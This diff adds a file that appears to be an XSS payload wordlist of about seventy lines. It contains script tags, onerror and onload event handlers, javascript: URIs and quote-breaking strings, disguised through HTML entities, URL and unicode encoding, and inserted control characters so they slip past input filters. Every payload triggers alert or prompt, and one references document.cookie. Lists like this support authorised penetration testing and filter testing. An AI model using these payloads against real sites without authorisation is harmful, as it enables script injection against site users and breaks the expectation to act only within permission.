@@ -1,0 +1,73 @@
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'';!--"<XSS>=&{()}
+\";alert('XSS');//
+‘; alert(1);
+‘)alert(1);//
+'';!--\"&lt;XSS&gt;=&{()}
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+<--`<img/src=` onerror=alert(1)> --!>
+&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+" onfocus=alert(document.domain) "> <"
+ja&Tab;vascript:alert(1)
+ja&NewLine;vascript:alert(1)
+ja&#x0000A;vascript:alert(1)
+java&#x73;cript:alert()
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+javascript:a\u006Cert``"
+javascript:\u0061\u006C\u0065\u0072\u0074``
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+%27%09);%0d%0a%09%09[1].find(alert)//
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+¼script¾alert(¢XSS¢)¼/script¾
+%253cscript%253ealert(document.cookie)%253c/script%253e
+</scrip</script>t><img src =q onerror=prompt(8)>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+\x3Cscript>javascript:alert(1)</script>
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
+`"'><img src='#\x27 onerror=javascript:alert(1)>
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
+`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+"`'><script>\x0Bjavascript:alert(1)</script>
+"`'><script>\x20javascript:alert(1)</script>
